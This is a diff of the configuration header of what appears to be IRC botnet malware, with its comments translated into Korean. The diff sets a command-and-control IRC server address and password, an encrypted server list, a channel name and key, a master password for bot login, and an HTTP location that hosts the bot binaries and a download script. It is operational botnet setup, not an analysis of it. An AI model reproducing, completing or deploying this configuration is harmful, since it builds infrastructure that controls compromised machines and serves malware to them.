@@ -3,34 +3,32 @@
 #ifndef __CONFIG_H_
 #define __CONFIG_H_
 
-/* BACKGROUND MODE '0', DEBUG MODE '1' (JUST FOR DEVELOPERS) */
+/* 백그라운드 모드 '0', 개발자 모드 '1'*/
 #define background_mode 0
 
-/* IRC SERVER SYNTAX: IP:PORT                            */
-/* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
-/* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
-/* HAVE AN MODDED PROTOCOL IRCD!!!                       */
-#define irc_servers  "127.0.0.1:6666|127.0.0.2:6667"
+/* IRC 서버 문법: IP:PORT 혹은 IP:PORT|IP:PORT 형식으로 최대 10개까지 추가 가능*/
+/* passproto(IRC프로토콜에서 사용하는 값), irc_passwd(서버 접근 시 비번) 변경 금지*/
+#define irc_servers  "172.25.235.247:6666"
 #define passproto    "PASS"
 #define irc_passwd   "fuckya"
-/* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
-/* USE HIDE.C TO CREATE YOUR CRYPTED SERVER LIST    */
+
+/* 서버 주소를 암호화 하는 설정이지만 사용하지 않는다. */
 #define encirc 0
 #define enc_servers ">.,C_>C>,C@<@U+<<<F>.,C_>C>,C@<>U+<<<F>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
 #define enc_passwd  "bcdi"
 
-/* CHANNEL NAME */
-#define irc_chan      "#chan"
-/* ENABLE FULL MESSAGES, '0'=OFF '1'=ON */
-/* NOTE: THAT PRODUCE MORE LAG!         */
+/* 접속할 채널 명 */
+#define irc_chan      "#HearthStone"
+/* 자신이 실행되고 있는 내용에 대해서 상태를 return 해줌
+ '0'=OFF '1'=ON 랙을 유발시킴. 변경 금지*/
 #define all_messages  0
-/* CHANNEL KEY */
+/* 대화방 비밀번호 설정시 비밀번호. 변경 금지 */
 #define irc_chankey   "key"
 
-/* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
+/* 마스터 호스트 인증. ip주소와 비밀번호를 입력. */
+/*.login에 사용하므로 기록해놓을것*/
 #define master_host     "@hostname.tld"
-/* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
-#define master_password "pwn"
+#define master_password "psw1"
 
 /* HTTP REFERENCE (WHERE YOU UPLOAD BINARIES AND GETBINARIES.SH) */
 #define reference_http  "http://127.0.0.1"
